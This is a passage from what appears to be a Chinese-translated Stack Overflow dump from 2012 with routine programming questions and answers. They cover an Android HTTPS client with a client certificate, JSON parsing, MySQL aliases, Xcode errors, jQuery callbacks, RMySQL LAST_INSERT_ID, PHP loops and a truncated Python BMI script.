            ByteArrayInputStream pkcs12BAIS = new ByteArrayInputStream(pkcs12);
            mycert.load(pkcs12BAIS, password.toCharArray());

            SSLSocketFactory sockfact = new SSLSocketFactory(mycert, null, null);

             sockfact.setHostnameVerifier(new StrictHostnameVerifier());

            // Done temporarily to accept all hosts
            //sockfact.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);

            SchemeRegistry registry = new SchemeRegistry();
            registry.register(new Scheme("https", sockfact, 443));

            BasicHttpParams httpParameters = new BasicHttpParams();
            HttpProtocolParams.setUseExpectContinue(httpParameters, false);
            HttpProtocolParams.setVersion(httpParameters, HttpVersion.HTTP_1_1);

            HttpConnectionParams.setConnectionTimeout(httpParameters, _TIMEOUT);
            HttpConnectionParams.setSoTimeout(httpParameters, _TIMEOUT);

            ThreadSafeClientConnManager cm = new ThreadSafeClientConnManager(
                    httpParameters, registry);
            cm.closeExpiredConnections();
            cm.closeIdleConnections(3000, TimeUnit.MILLISECONDS);

            _httpClient = new MyHttpClient(cm, httpParameters);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    } 
```

在开始进行 HTTPS 调用之前调用上述方法

# java - 如何从Java中的JSON字符串中检索值数组中的值

> ID：10246394
> 
> 赞同：0
> 
> 时间：2012-04-20T12:38:03.760
> 
> 标签：java, json

鉴于返回的以下 JSON 字符串：

```
String s = "{"errorCode":0,"result":"Processed","trips":[{"tripDestination":"Vancouver","tripStartTime":"07:41"},{"tripDestination":"Montreal","tripStartTime":"08:04"}]}"; 
```

我可以很容易地得到 errorCode 和结果，例如：

```
JSONObject jObject;
jObject = new JSONObject(s);

String result = jObject.getString("result");
Log.v("JSON Result", result); 
```

但是我知道它是 JSON 字符串中的一个值数组，我会得到tripDestiation 值吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:41:16.987

你可能想要这个`getJSONArray()`方法。

请参阅：[http](http://www.json.org/javadoc/org/json/JSONObject.html#getJSONArray(java.lang.String) ://www.json.org/javadoc/org/json/JSONObject.html#getJSONArray(java.lang.String )

**编辑**：我会使用类似的东西：

```
ArrayList<String> destinations = new ArrayList<String>();
JSONArray trips = jObject.getJSONArray("trips");
for (int i = 0; i < trips.length(); i++) {
    destinations.add(trips.getJSONObject(i).getString("tripDestination"));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:43:52.490

```
jObject.getJSONArray("trips").getJSONObject(0).getString("tripDestination"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:45:16.003

您可以使用：

```
JSONArray jsonArray = jObject.getJSONArray("trips"); 
```

但是考虑使用[GSON](http://code.google.com/p/google-gson/)来解析 json。它很可爱：

```
public class Class1 {
    private String erroCode;
    private String Processed;
    private Class2[] trips;
}

class Class2 {
    private String tripDestination;
    private String tripStartTime;
}

Gson gson = new Gson();
Class1 object = gson.fromJson(s, Class1.class); 
```

# php - PHP数组与mysql连接结果

> ID：10246398
> 
> 赞同：0
> 
> 时间：2012-04-20T12:38:30.120
> 
> 标签：php, mysql, sql

我有一个带有连接的数据库查询。

我在数据库中的表确实有一些不唯一的名称。即在“事件”表中有一个列`dsc`，在`module`表中有一个列`dsc`。

我的问题是，当我将 JOIN 表查询的结果带入 php 数组时，如何在两个不同的表字段之间进行选择。

所以对于一个我会说 $result['dsc'];

我想像 $resuilt['event.dsc'];

不过似乎不太管用：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:41:33.373

您可以在查询中选择它们作为不同的名称：

```
SELECT `module`.`dsc` AS `mdsc`, `event`.`dsc` AS `edsc` ... 
```

然后，

```
$result["mdsc"]; $result["edsc"]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:41:33.667

您可以使用别名作为列名

```
select module.dsc as mod_dsc, event.dsc as edsc .... 
```

# xcode - xcode 生成内部错误消息

> ID：10246399
> 
> 赞同：3
> 
> 时间：2012-04-20T12:38:38.727
> 
> 标签：xcode

当我尝试打开我的项目时，我收到“内部错误”消息。您对正在发生的事情有任何想法吗？

> Xcode 遇到内部逻辑错误。选择“继续”以在不一致的状态下继续运行 Xcode。选择“Crash”以停止 Xcode 并使用 Crash Reporter 提交错误。选择“崩溃”将导致所有未保存的数据丢失。

细节如下所示：

```
ASSERTION FAILURE in /SourceCache/IDEFoundation/IDEFoundation-943/Framework/Classes/Model/Execution/RunContext/IDEBuildSchemeAction.m:912
Details:  (_buildableReference) should not be nil.
Object:   <IDEBuildActionEntry: 0x403120140>
Method:   -dvt_awakeFromXMLUnarchiver:
Thread:   <NSThread: 0x40010a220>{name = (null), num = 1}
Hints:   None
Backtrace:
  0  0x000000010b6a8366 -[IDEAssertionHandler handleFailureInMethod:object:fileName:lineNumber:messageFormat:arguments:] (in IDEKit)
  1  0x000000010ad201a4 _DVTAssertionFailureHandler (in DVTFoundation)
  2  0x000000010b246e89 -[IDEBuildActionEntry dvt_awakeFromXMLUnarchiver:] (in IDEFoundation)
  3  0x000000010ad2585a -[DVTXMLUnarchiver decodeElementNodeWithXMLTextReader:owner:container:parsingState:success:error:] (in DVTFoundation)
  4  0x000000010ace024a -[DVTXMLUnarchiver decodeNodeWithXMLTextReader:owner:container:parsingState:error:] (in DVTFoundation)
  5  0x000000010ad25551 -[DVTXMLUnarchiver decodeElementNodeWithXMLTextReader:owner:container:parsingState:success:error:] (in DVTFoundation)
  6  0x000000010ace024a -[DVTXMLUnarchiver decodeNodeWithXMLTextReader:owner:container:parsingState:error:] (in DVTFoundation)
  7  0x000000010ad25551 -[DVTXMLUnarchiver decodeElementNodeWithXMLTextReader:owner:container:parsingState:success:error:] (in DVTFoundation)
  8  0x000000010ace024a -[DVTXMLUnarchiver decodeNodeWithXMLTextReader:owner:container:parsingState:error:] (in DVTFoundation)
  9  0x000000010ad25551 -[DVTXMLUnarchiver decodeElementNodeWithXMLTextReader:owner:container:parsingState:success:error:] (in DVTFoundation)
 10  0x000000010ace024a -[DVTXMLUnarchiver decodeNodeWithXMLTextReader:owner:container:parsingState:error:] (in DVTFoundation)
 11  0x000000010acdff6a -[DVTXMLUnarchiver _readAndReturnError:] (in DVTFoundation)
 12  0x000000010acdfc84 -[DVTXMLUnarchiver decodeWithRootObject:error:] (in DVTFoundation)
 13  0x000000010b245cc5 +[IDEScheme schemeFromXMLData:withRunContextManager:customDataStoreContainer:customDataSpecifier:isShown:orderHint:error:] (in IDEFoundation)
 14  0x000000010b24542e -[IDERunContextManager _updateMap:contextForCustomDataStore:specifier:] (in IDEFoundation)
 15  0x000000010b244b6f -[IDERunContextManager _customDataStoresDidUpdate] (in IDEFoundation)
 16  0x000000010ad2a9d0 -[NSObject(DVTPropertyLinking) dvt_addObserverWithName:toKeyPath:ofObject:block:] (in DVTFoundation)
 17  0x000000010b244554 -[IDERunContextManager initWithWorkspace:] (in IDEFoundation)
 18  0x000000010b2441e5 -[IDEWorkspace _setupRunContextManager] (in IDEFoundation)
 19  0x000000010b29e02e __81-[IDEWorkspace _finishLoadingAsynchronously:shouldUpgradeFromSimpleFilesFocused:]_block_invoke_0 (in IDEFoundation)
 20  0x00007fff8d9a3b05 -[NSBlockOperation main] (in Foundation)
 21  0x00007fff8d96a6d8 -[__NSOperationInternal start] (in Foundation)
 22  0x00007fff8d97d936 ____NSOQSchedule_block_invoke_2 (in Foundation)
 23  0x00007fff81bde8ba _dispatch_call_block_and_release (in libdispatch.dylib)
 24  0x00007fff81be072a _dispatch_main_queue_callback_4CF (in libdispatch.dylib)
 25  0x00007fff81f3506c __CFRunLoopRun (in CoreFoundation)
 26  0x00007fff81f34676 CFRunLoopRunSpecific (in CoreFoundation)
 27  0x00007fff87a8231f RunCurrentEventLoopInMode (in HIToolbox)
 28  0x00007fff87a895c9 ReceiveNextEventCommon (in HIToolbox)
 29  0x00007fff87a89456 BlockUntilNextEventMatchingListInMode (in HIToolbox)
 30  0x00007fff86c93f5d _DPSNextEvent (in AppKit)
 31  0x00007fff86c93861 -[NSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] (in AppKit)
 32  0x00007fff86c9019d -[NSApplication run] (in AppKit)
 33  0x00007fff86f0eb88 NSApplicationMain (in AppKit)
 34  0x000000010acb3eec (in Xcode)
 35  0x0000000000000002 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T17:11:21.173

你真的不应该在像 Xcode 这样的产品中看到“内部错误”。您看到的不是一个错误，就是没有人认为会发生的情况。根本原因可能是某种格式错误的项目文件：我们可以从堆栈跟踪中看到 Xcode 正在读取 XML 文件，并且您说它发生在 Xcode 打开您的项目时。

我将首先创建一个新的项目文件，然后将所有文件添加到您的项目中。这可能会让人头疼，但它通常是从与项目文件相关的问题中恢复的最有效方法。

如果这听起来工作量太大，并且您认为自己知道问题所在，您可以尝试手动编辑现有项目文件。按住 Control 键单击项目文件并从上下文菜单中选择“显示包内容”以显示项目文件中的文件，这实际上是一个文件包。然后在您喜欢的文本编辑器中打开“project.pbxproj”文件以查看定义项目的 XML。不难看到文件的结构，因此您可能会发现问题。

例如，昨晚我不小心将 Xcode 本身添加为我项目的框架之一。这导致 Xcode 挂起，我不得不强制退出。更糟糕的是，Xcode 会尝试打开您上次退出时打开的项目，因此再次启动 Xcode 会导致再次挂起。（您可以通过在启动 Xcode 时按住 Shift 键来避免这种情况。）我使用 TextMate 打开项目文件，在链接框架部分找到对 Xcode.app 的引用，然后将其删除。手术很成功，患者完全康复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T20:36:19.687

这可能是您的项目文件或 Xcode 配置文件已损坏的情况。这些都是 XML 文件，这可以解释为什么您的堆栈跟踪指示 xml 解析问题。堆栈跟踪还指示（来自 IDE 前缀）当 Xcode 尝试将自身组织为集成开发环境时发生错误。

这里有几个选项：

1.  尝试在 Xcode 中打开或创建另一个项目。如果您能够做到这一点，那么再次尝试在 Xcode 中打开您现有的项目。
2.  尝试在另一台机器上或当前机器上的另一个版本的 Xcode 上的另一个 Xcode 安装中打开您的项目。如果项目在另一个安装中打开，则重新安装您的 Xcode。
3.  创建一个新项目。一次复制几个文件中的所有 h、m 和资源文件。重新设置项目。
4.  您总是可以通过在文本编辑器中打开项目文件来尝试找到一些格式错误的 xml。（没什么好玩的）

# java - 体面的 Java 命令行解析和执行

> ID：10246401
> 
> 赞同：4
> 
> 时间：2012-04-20T12:38:40.243
> 
> 标签：java, symfony, console, console-application, command-line-arguments

我来自 Symfony2 的世界 (PHP)，我正在尝试找到与其[控制台](http://symfony.com/doc/current/components/console.html)组件相当的等价物。

我尝试了很多东西：args4j、jcommander 等……但我想要这样的东西：http: [//symfony.com/doc/current/components/console.html#creating-a-basic-command](http://symfony.com/doc/current/components/console.html#creating-a-basic-command)。我希望能够编写一个类来配置我的参数（jcommander 和 args4j 做得很好），*并*在其中编写我的相关`execute()`方法，该方法将被自动调用。Java中是否存在类似的东西？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T18:11:18.420

所以... 在尝试了不同的所谓的命令行参数解析器之后，看到没有人做得足够好（主要是没有颜色处理），我决定将 Symfony2 的控制台组件移植到 Java 中。你可以在这里看到结果：[https](https://github.com/nanocom/console) ://github.com/Nanocom/console 。

目前，它仍处于测试状态。仍然需要完成一些部分，但您已经可以声明您的命令并执行它们。

希望你会喜欢它！许可证是麻省理工学院。

欢迎任何贡献！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:49:57.160

首先，您需要记住 symphony 它是 php 项目的框架，因此可以从命令行创建项目、类等，因为该框架是为此而设计的，但是对于 java 则不同，java 本身并没有为您提供该功能. 在您的情况下，您需要找到一个允许创建类或项目的框架，我可以向您推荐的最接近的框架是 andromda 墨盒与 maven 相结合，但您仍然需要定义模板

# c# - Mvc Contrib Portable area - 换掉总线？

> ID：10246402
> 
> 赞同：1
> 
> 时间：2012-04-20T12:38:45.510
> 
> 标签：c#, asp.net-mvc, mvccontrib, servicebus, portable-areas

是否可以将公共汽车换成公共交通之类的东西？我的应用程序中已经有一个服务总线，所以不想再介绍一个。

理想情况下，我可以通过 IoC 对其进行配置，但听起来总线拥有 IoC 容器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T20:18:27.637

据我所知，您可以提供自己的实现`IApplicationBus`

```
public interface IApplicationBus:IList<Type>
{
    void Send(IEventMessage eventMessage);
    void SetMessageHandlerFactory(IMessageHandlerFactory factory);
} 
```

可移植区域使用`Bus`类的实例，该实例在内部使用提供的`IApplicationBus`接口实例或类的本地默认值`ApplicationBus`。以下界面适合您的需要，因此您可以轻松完成。

# objective-c - 如何将块作为带有参数的选择器传递给 performSelector:withObject:？

> ID：10246403
> 
> 赞同：0
> 
> 时间：2012-04-20T12:38:52.163
> 
> 标签：objective-c, ios, selector, block

是否可以创建一个块变量作为选择器接受参数，并将其传递给 performSelector:withObject:？目前，正在编写一些测试并希望编写一个包含所有相关检查的自包含方法。需要传递一个块，接收其中的参数并在该块中进行一些检查。我正在寻找类似的东西：

```
...
SEL blockAsSelector = ^{(NSString *param){NSLog(@"Passed param = %@", param);}}

[self performSelector:blockAsSelector withObject:stringThatWillBeUsedAsParamInBlock];
... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:18:38.790

> 是否可以创建一个块变量作为选择器接受参数，并将其传递给 performSelector:withObject:？

不，块和选择器不是一回事。

在您的示例中，这没有意义。 `-performSelector:withObject:`在同一个线程上同步运行。你不妨只执行块即

```
void (^myBlock)(NSString*) = ^(NSString *param){NSLog(@"Passed param = %@", param);};

myBlock(@"foo"); 
```

如果你想同时在块中完成工作，你会使用 GCD 或 NSBlockOperation。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:45:16.080

如果您不需要延迟来执行操作，您可以：

```
[[NSOperationQueue mainQueue] addOperationWithBlock:^(void)block] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-10T18:25:42.243

我通常同意其他答案，您应该尝试找到另一种方法来做到这一点，因为选择器和块实际上并不是可以互换的。但是，如果您绝对必须这样做，我认为这样的事情将是您最好的选择：

```
// BlockWrapper.h

@interface BlockWrapper : NSObject

@property(nonatomic, retain) void (^block)(NSString*);
@property(nonatomic, copy) NSString* string;

@end

// Your other code file

- (void)evaluateBlockWrapper:(BlockWrapper)wrapper {
    wrapper.block(wrapper.string);
}

...
BlockWrapper* wrapper = [[BlockWrapper alloc] init];
wrapper.block = ^(NSString* param) { NSLog(@"Passed param = %@", param); }
wrapper.string = stringThatWillBeUsedAsParamInBlock;

[self performSelector:@selector(evaluateBlockWrapper:) withObject:wrapper];
... 
```

虽然这让我想知道为什么你想让块接受一个字符串参数，而不是仅仅引用块内的字符串：

```
// Your other code file

- (void)evaluateBlock:(void (^)(void))block {
    block();
}

...
[self performSelector:@selector(evaluateBlock:)
    withObject:^{
        NSLog(@"Passed param = %@", stringThatWillBeUsedAsParamInBlock);
    }];
... 
```

我不太确定这里的所有内存管理，所以其他人将不得不仔细检查我。

# jquery - .trigger 函数的回调

> ID：10246409
> 
> 赞同：0
> 
> 时间：2012-04-20T12:39:13.240
> 
> 标签：jquery, ajax

我有以下代码：

```
 $("#scheduleLink").trigger("click");
 alert("text") 
```

这是点击处理程序：

```
$("#scheduleLink").bind("click", (function () {
            loadScheduleEvent();
            $(".wrap_tabs").find("a").removeClass("active"); 
            $(this).addClass("active");
        })); 
```

和`loadScheduleEvent`功能：

```
function loadScheduleEvent() {
        var eventId = $(".movie").attr("eventId");
        var type = $(".movie").attr("type");
        $("#publicationBlockContent").load("/Publication/EventSchedule?eventId=" + eventId + "&type=" + type);
    } 
```

我想这段代码是异步工作的。我希望`alert("text")` 仅在完成时调用`loadScheduleEvent`。我怎样才能做到这一点？

谢谢。

**更新：** 事实上，不是`alert("text")`有一些代码。而且，我无法将此代码移至 `$.load` 函数回调。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:40:25.833

使用 .load 回调

```
$("#publicationBlockContent")
    .load("/Publication/EventSchedule?eventId=" + eventId + "&type=" + type,
          function(){alert("text");}
    ); 
```

rtm [http://api.jquery.com/load/](http://api.jquery.com/load/)用于附加回调参数等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:43:33.823

如果您不想将代码替换为警报，那么您可以做的就是触发一个事件，该事件触发您的行为被警报替换。

```
$("#scheduleLink").bind("click", (function () {
        loadScheduleEvent();
        $(".wrap_tabs").find("a").removeClass("active"); 
        $(this).addClass("active");
    }));

$(window).bind("scheduleComplete", (function (event,params) {
      alert(params);
    })); 
```

现在在 loadScheduleEvent 你必须触发它。

```
 function loadScheduleEvent() {
    var eventId = $(".movie").attr("eventId");
    var type = $(".movie").attr("type");
    $("#publicationBlockContent").load("/Publication/EventSchedule?eventId=" + eventId + "&type=" + type,function(){$(window).trigger("scheduleComplete");});
} 
```

最后，当你执行这个序列时，你只需要触发点击事件

```
$("#scheduleLink").trigger("click"); 
```

此外，如果您不希望 scheduleComplete 事件对窗口公开，您也可以将它与您的 scheduleLink 绑定，并获得该行为的范围和具体！！！...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:46:00.547

```
$("#publicationBlockContent").load"/Publication/EventSchedule?eventId=" + eventId + "&type=" + type,    
function (responseText, textStatus, XMLHttpRequest) {     
if (textStatus == "success") {          
alert("success")
}
 if (textStatus == "error") {
      alert("failed")
 }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-17T08:34:05.840

看起来有3个解决方案：

1 - 创建一个函数，并从 .load 上的回调调用它

```
function loadComplete() {
    alert("text");
}

$("#scheduleLink")
.on("click", function () {

    $("#publicationBlockContent")
    .load("/my-url", function () {
        loadComplete();
    });

})
.trigger("click"); 
```

2 - 将自定义事件绑定到名为“loadComplete”的 $("#scheduleLink")，并从 .load 上的回调触发它

```
$("#scheduleLink")
.on("loadComplete", function () {
    alert("text");
})
.on("click", function () {

    $("#publicationBlockContent")
    .load("/my-url", function () {
        $("#scheduleLink").trigger("loadComplete");
    });

})
.trigger("click"); 
```

3 - 如果不需要 .load，可以使用 $.ajax、$.get 和 $.post 支持的 promise 对象

```
$("#scheduleLink")
.on("click", function () {

    return $.get("/my-url", function () {
        $("#scheduleLink").trigger("loadComplete");
    });

})
.trigger("click");

var promise = $("#scheduleLink").triggerHandler("click");
promise && promise.done(function () {
    alert("click");
}); 
```

# mysql - LAST_INSERT_ID() 始终返回 0 (RMySQL) - 单独的连接问题

> ID：10246412
> 
> 赞同：6
> 
> 时间：2012-04-20T12:39:23.037
> 
> 标签：mysql, r, rmysql, last-insert-id

## 在一些[帖子中找到的原始示例](http://osdir.com/ml/db.mysql.windows/2003-04/msg00121.html)

根据这篇[文章](http://osdir.com/ml/db.mysql.windows/2003-04/msg00121.html)，以下 SQL 语句 `1, 2, 2, 2, 2`最后应该给我一个向量：

```
require("RMySQL")
con <- dbConnect(
    dbDriver("MySQL"),
    db="your_db",
    user="your_user",
    password="your_pw", 
    host="localhost"
)
> con
<MySQLConnection:(6640,122)> 
> dbSendQuery(con, "DROP TABLE IF EXISTS t;")
<MySQLResult:(6640,122,0)> 
> dbSendQuery(con, "CREATE TABLE t (i INT NOT NULL AUTO_INCREMENT PRIMARY KEY);")
<MySQLResult:(6640,122,1)> 
> dbSendQuery(con, "INSERT INTO t VALUES(NULL);")
<MySQLResult:(6640,122,2)> 
> dbGetQuery(con, "SELECT LAST_INSERT_ID() FROM t;")
  LAST_INSERT_ID()
1                0
> dbSendQuery(con, "INSERT INTO t VALUES(NULL),(NULL),(NULL);")
<MySQLResult:(6640,122,3)> 
> dbGetQuery(con, "SELECT LAST_INSERT_ID() FROM t;")
  LAST_INSERT_ID()
1                0
2                0
3                0
4                0 
```

## 遵循[NB](https://stackoverflow.com/users/693806/n-b)、[Jeff Allen](https://stackoverflow.com/users/1133019/jeff-allen)和[Quassnoi的建议](https://stackoverflow.com/users/55159/quassnoi)

对示例进行了修改，使其比原始用例更类似于真实用例：

```
dbSendQuery(con, "DROP TABLE IF EXISTS t;")
dbSendQuery(con, paste("CREATE TABLE t", 
    "(i INT NOT NULL AUTO_INCREMENT PRIMARY KEY, x INT);"))
> dbGetQuery(con, "SELECT CONNECTION_ID();")
  CONNECTION_ID()
1          673490
dbSendQuery(con, "INSERT INTO t SET x=1;")
> dbGetQuery(con, "SELECT CONNECTION_ID();")
  CONNECTION_ID()
1          673491
> dbGetQuery(con, "SELECT LAST_INSERT_ID();")
  LAST_INSERT_ID()
1                0
> dbGetQuery(con, "SELECT CONNECTION_ID();")
  CONNECTION_ID()
1          673493
> dbGetQuery(con, "SELECT LAST_INSERT_ID();")
  LAST_INSERT_ID()
1                0
dbSendQuery(con, "INSERT INTO t SET x=2;")
> dbGetQuery(con, "SELECT LAST_INSERT_ID();")
  LAST_INSERT_ID()
1                0
> dbGetQuery(con, "SELECT * FROM t;")
  i x
1 1 1
2 2 2 
```

好吧，它没有，真的;-)

我用谷歌搜索了一下，AFAIU`LAST_INSERT_ID()`是“连接感知”的，因为如果要正常工作，必须使用相同的连接。但是，我认为通过将连接对象分配给`con`我可以确保在上面的每个语句中确实使用**了相同的连接。**

好吧，显然不是 ;-) 任何人都可以帮助我提供一些解释和/或解决方法吗？但是，使用类似的东西`select max(<ID>) from <TABLE>`不会减少它，因为我正在运行同时写入数据库的多个线程，因此如果这样做会弄乱 ID 检索。

谢谢！

## 截至 2012 年 4 月 20 日的调查结果

*   多亏了[Quassnoi](https://stackoverflow.com/users/55159/quassnoi)，我才能够更多地找到问题所在。似乎`RMySQL`函数并不真正关心显式`conn`参数，而是每次连接到数据库时都会在后台打开新连接。可能也有一些很好的理由。然而，有谁知道如何避免这种情况？
*   刚刚联系了 Jeffrey Horner（[RMySQL](http://cran.r-project.org/web/packages/RMySQL/index.html)包的维护者）。似乎这是一个Windows问题。在 Linux 上为他工作：-/

## 连接细节

正如[杰夫所建议的那样](https://stackoverflow.com/users/165384/jeff)

```
> dbGetInfo(con)
$host
[1] "localhost"

$user
[1] "your_user"

$dbname
[1] "your_db"

$conType
[1] "localhost via TCP/IP"

$serverVersion
[1] "5.5.20"

$protocolVersion
[1] 10

$threadId
[1] 673489

$rsId
$rsId[[1]]
<MySQLResult:(6640,171,3)> 

> dbGetInfo(dbDriver("MySQL"))
$drvName
[1] "MySQL"

$connectionIds
$connectionIds[[1]]
<MySQLConnection:(6640,149)> 

$connectionIds[[2]]
<MySQLConnection:(6640,112)> 

$connectionIds[[3]]
<MySQLConnection:(6640,171)> 

$fetch_default_rec
[1] 500

$managerId
<MySQLDriver:(6640)> 

$length
[1] 16

$num_con
[1] 3

$counter
[1] 179

$clientVersion
[1] "5.5.20"

> dbListConnections(dbDriver("MySQL"))
[[1]]
<MySQLConnection:(6640,149)> 

[[2]]
<MySQLConnection:(6640,112)> 

[[3]]
<MySQLConnection:(6640,171)> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-11-05T18:03:44.593

我在[这里](http://www.r-bloggers.com/mysql-and-r/)找到了一个可行的解决方案。stephan mc 的回复中也提到了它，但作为第二种选择。第一个对我不起作用，所以我认为这可能值得更多强调。

无论如何，诀窍是在and`dbClearResult()`之间运行：`INSERT``SELECT LAST_INSERT_ID()`

```
> library("RMySQL")
> con <- dbConnect(MySQL())
> dbSendQuery(con, "DROP TABLE IF EXISTS t;")
> dbSendQuery(con, "CREATE TABLE t (i INT NOT NULL AUTO_INCREMENT PRIMARY KEY);")
> res <- dbSendQuery(con, "INSERT INTO t VALUES (NULL);")

# doesn't work:
> dbGetQuery(con, "SELECT LAST_INSERT_ID();")
  LAST_INSERT_ID()
1                0

# works:
> dbClearResult(rs)
> dbGetQuery(con, "SELECT LAST_INSERT_ID();")
  LAST_INSERT_ID()
1                1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:09:04.343

您正在将`NULL`值插入到主键列中。由于您不能有两行具有相同的 PK，因此您实际上可能没有插入任何真实数据（这也可能是您想要捕获的错误）。尝试：

```
dbSendQuery(con, "INSERT INTO t VALUES(5);") 
```

执行该操作应该会为您提供两个不同的 last_insert_id 值。

编辑：误会了。有关的详细信息，请参见[此处](http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_last-insert-id)`LAST_INSERT_ID`。修改后的答案：如果您没有在`AUTO_INCREMENT`列中指定值，*那么*您应该得到一个`LAST_INSERT_ID`返回值。在这种情况下，请尝试：

```
INSERT INTO t DEFAULT VALUES 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-28T06:01:42.080

We found a very interesting solution:

```
res <- dbSendQuery(con, "INSERT INTO t VALUES (5);")
res <- dbSendQuery(con, "SELECT LAST_INSERT_ID();")
fetch(res) 
```

If it does not work, use a `dbClearResult(res)` before sending the last id request. For us it worked out.

# php - PHP - 嵌套 foreach 循环中的未设置对象

> ID：10246414
> 
> 赞同：1
> 
> 时间：2012-04-20T12:39:28.190
> 
> 标签：php, arrays, oop, foreach, unset

长话短说 - 尝试`$this->models[$modelKey]`在第一个 foreach 中取消设置时，取消设置工作正常，`$this->models[$modelKey]->equipmentList->equipment[$eqKey]`指向正确的对象，但在嵌套的 foreach 中取消设置不起作用。有任何想法吗？提前感谢您的帮助。

```
public function processModelsEquipmentList() {
    foreach ($this->models as $modelKey => $model) {
      if (!strstr('#', $model->id)) {
        foreach ($model->equipmentList->equipment as $eqKey => $equipment) {
          if (in_array($equipment->code, $this->specialVersionsCodes)) {
            $newModel = clone $model;   
            $newModel->name.= ' ' . $equipment->name;
            $newModel->id.= '#' . $equipment->id;
            if (strlen($newModel->code) < 4) {
              $newModel->code.=$equipment->code;
            }
            $newModel->order = $newModel->order + 1;
            $newEquipmentList = new EquipmentList($newModel->id, true);
            $newEquipmentList->add(clone $equipment);
            $newModel->setNewEquipmentList($newEquipmentList);
            $this->addModel($newModel);
            //echo $this->models[$modelKey]->equipmentList->equipment[$eqKey]->name;die();
            unset($this->models[$modelKey]->equipmentList->equipment[$eqKey]);
          }
        }
      }
    }
  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:43:52.490

它不是通过 $model 访问的，而不是 $this->models 访问的吗？和 $equipment 一样。

试试这个：

```
unset($equipment[$eqKey]); 
```

一些扩展：

```
foreach ($this->models as $modelKey => $model) {
    //here you use $model to access $this->models[X]
    foreach ($model->equipmentList->equipment as $eqKey => $equipment) { 
        //here you use $equipment to access $this->models[X]->equipmentList->equipment[x]
    } 
} 
```

**编辑：**

现在我得到了解决方案：

```
foreach ($this->models as $modelKey => $model) {
    foreach ($model->equipmentList->equipment as $eqKey => $equipment) {
        //use the $modelKey key and not the $eqKey
        unset($model->equipmentList->equipment[$modelKey]);
    } 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:56:00.697

万一我发现了，我会把这个作为答案，但如果我错了，我会把它移到评论中：

首先，您在最后克隆您尝试取消设置的对象。为什么不在克隆后立即取消设置？

其次，我认为对象是按设计通过引用传递给 foreach 循环的，因此您不需要引用键。

如果我是对的，这可能有效：

```
public function processModelsEquipmentList() {
    foreach ($this->models as $modelKey => $model) {
      if (!strstr('#', $model->id)) {
        foreach ($model->equipmentList->equipment as $eqKey => $equipment) {
          if (in_array($equipment->code, $this->specialVersionsCodes)) {
            $newModel = clone $model;
            unset($model);  // <-- Unesetting after clone, using loop var name.
            $newModel->name.= ' ' . $equipment->name;
            $newModel->id.= '#' . $equipment->id;
            if (strlen($newModel->code) < 4) {
              $newModel->code.=$equipment->code;
            }
            $newModel->order = $newModel->order + 1;
            $newEquipmentList = new EquipmentList($newModel->id, true);
            $newEquipmentList->add(clone $equipment);
            $newModel->setNewEquipmentList($newEquipmentList);
            $this->addModel($newModel);
          }
        }
      }
    }
  } 
```

# asp.net - ASP.NET 通用提供程序

> ID：10246415
> 
> 赞同：8
> 
> 时间：2012-04-20T12:39:28.843
> 
> 标签：asp.net, membership-provider

有人可以提供一些关于什么是 asp.net 通用提供程序的信息，为什么以及何时使用它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-20T18:16:54.017

基本上，这些提供程序与 sql 无关，并确保您的应用程序可以在 sqlazure 和任何其他 sql 数据库上运行

# hadoop - 亚马逊流式弹性mapreduce获取输入文件名并设置输出

> ID：10246417
> 
> 赞同：0
> 
> 时间：2012-04-20T12:39:39.970
> 
> 标签：hadoop, amazon-web-services

我正在使用亚马逊流媒体功能，是否可以获得文件输入名称？

我也可以设置输出，所以每个新行都不是一个新文件吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-29T06:17:23.463

You're not using this correctly, if this is your question. Your mapper should not care which file it's working on. It gets a block of data from the entire set matching your --input argument, sends it to the mapper on the STDIN. The mapper should process the input and output a **key**\t**val1**,**val2**,... Those are then passed to (one of) your reducer on its STDIN.

# python - 类型错误：& 不支持的操作数类型：'float' 和 'float'

> ID：10246418
> 
> 赞同：2
> 
> 时间：2012-04-20T12:39:42.107
> 
> 标签：python, syntax, syntax-error

我编写了这个简单的程序来计算一个人的 BMI。但我无法完成它。下面是我的程序，

**程序**

```
h = input("Please Enter your height in meters:")
q = raw_input("Do you want to enter your weight in kg or lbs?")

if q=="kg":
         w1 = input("Please Enter your weight in kgs:")
         bmi1 = w1/(h*h) 
         print "Your BMI is", bmi1

         if bmi1 <= 18.5: 
                        print "Your are underweight."
         if bmi1 > 18.5 & bmi1 < 24.9: 
                                     print "Your weight is normal."
         if bmi1 > 25 & bmi1 < 29.9: 
                                   print "Your are overweight"              
         if bmi1 >= 30: 
                      print "Your are obese"                    

if q=="lbs":
